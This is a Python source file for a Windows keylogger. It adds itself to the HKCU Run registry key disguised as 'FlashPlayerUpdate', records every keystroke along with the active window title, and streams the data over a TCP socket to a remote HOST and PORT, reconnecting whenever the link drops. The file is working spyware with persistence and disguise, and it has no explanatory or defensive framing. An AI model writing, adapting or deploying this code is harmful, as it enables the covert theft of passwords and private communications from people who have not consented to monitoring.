
from pynput import keyboard
from os import path
from winreg import *


import win32gui as w32
import pickle
import time
import socket
import sys


keys = {
    'Key.backspace': '<BACKSPACE>',
    'Key.alt_l': '<LEFT-ALT>',
    'Key.alt_r': '<RIGHT-KEY>',
    'Key.shift': '<SHIFT>',
    'Key.ctrl_l': '<LEFT-CONTROL>',
    'Key.ctrl_r': '<RIGHT-CONTROL>',
    'Key.space': ' ',
    'Key.enter': '<ENTER>',
    'Key.up': '<ARROW-UP>',
    'Key.down': '<ARROW-DOWN>',
    'Key.right': '<ARROW-RIGHT>',
    'Key.left': '<ARROW-LEFT>',
    'Key.num_lock': '<NUM-LOCK>',
    'Key.caps_lock': '<CAPS-LOCK>',
    'Key.shift_r': '<SHIFT-RIGHT>',
    'Key.shift_l': '<SHIFT-LEFT>',
    'Key.cmd': '<CMD-KEY>',
    'Key.tab': '<TAB>',
    'Key.f1': '<F1>',
    'Key.f2': '<F2>',
    'Key.f3': '<F3>',
    'Key.f4': '<F4>',
    'Key.f5': '<F5>',
    'Key.f6': '<F6>',
    'Key.f7': '<F7>',
    'Key.f8': '<F8>',
    'Key.f9': '<F9>',
    'Key.f10': '<F10>',
    'Key.f11': '<F11>',
    'Key.f12': '<F12>',
    'Key.home': '<F12>',
    'Key.print_screen': '<PRINT-SCREEN>',
    'Key.delete': '<DELETE>',
}


def install():

        a_reg = ConnectRegistry(None, HKEY_CURRENT_USER)
        a_key = OpenKey(a_reg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(a_key, "FlashPlayerUpdate", 0, REG_SZ, sys.argv[0].replace('/', '\\'))
        open('ini', 'w')

if not path.isfile('ini'):
    install()


def addkey(key):
    try:
        return str(key.char)

    except:
        if str(key) not in keys:
            return str(key)
        else:
            return keys[str(key)]


def send(text):
    try:
        s.send(pickle.dumps({
            'cmd': 'upd',
            'data': text
        }))

    except:
        listener.stop()
        reload()


def reload():
    print('Reloading...')
    global s, listener
    while True:
        try:
            time.sleep(4)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            break

        except:
            pass

    listener = keyboard.Listener(
        on_press=hook)
    listener.start()
    listener.join()


def hook(key):
    global last_window

    resp = ''
    wind_now = w32.GetWindowText(w32.GetForegroundWindow())

    if wind_now != last_window:
        last_window = wind_now

        resp += wind_now + '\n'
        resp += addkey(key)
    else:
        resp += addkey(key)

    send(resp)


if __name__ == '__main__':
    last_window = ''
    current_time = int(time.time())

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            break

        except:
            pass

    listener = keyboard.Listener(
            on_press=hook)
    listener.start()
    listener.join()
